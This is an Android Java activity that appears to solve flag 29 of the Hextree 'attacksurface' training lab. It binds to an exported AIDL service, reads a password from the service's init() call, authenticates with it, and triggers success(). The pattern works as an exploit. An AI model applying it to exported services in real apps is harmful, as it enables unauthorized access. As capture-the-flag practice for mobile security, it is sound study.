package com.android.zerohextree;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import io.hextree.attacksurface.services.IFlag29Interface; // Make sure this matches your AIDL package

public class flag29 extends AppCompatActivity {

    private boolean isBound = false;
    private IFlag29Interface aidlService = null;

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            aidlService = IFlag29Interface.Stub.asInterface(binder);
            isBound = true;

            try {
                // Step 1: Get password
                String password = aidlService.init();
                Log.i("flag29", "Password received: " + password);

                // Step 2: Authenticate using password
                aidlService.authenticate(password);
                Log.i("flag29", "Authenticated successfully");

                // Step 3: Trigger success
                aidlService.success();
                Log.i("flag29", "Success called!");

            } catch (RemoteException e) {
                Log.e("flag29", "RemoteException occurred", e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            aidlService = null;
            isBound = false;
            Log.i("flag29", "Service disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flag29); // Make sure this layout exists

        // Bind to Flag29Service
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isBound) {
            unbindService(connection);
            isBound = false;
        }
    }
}
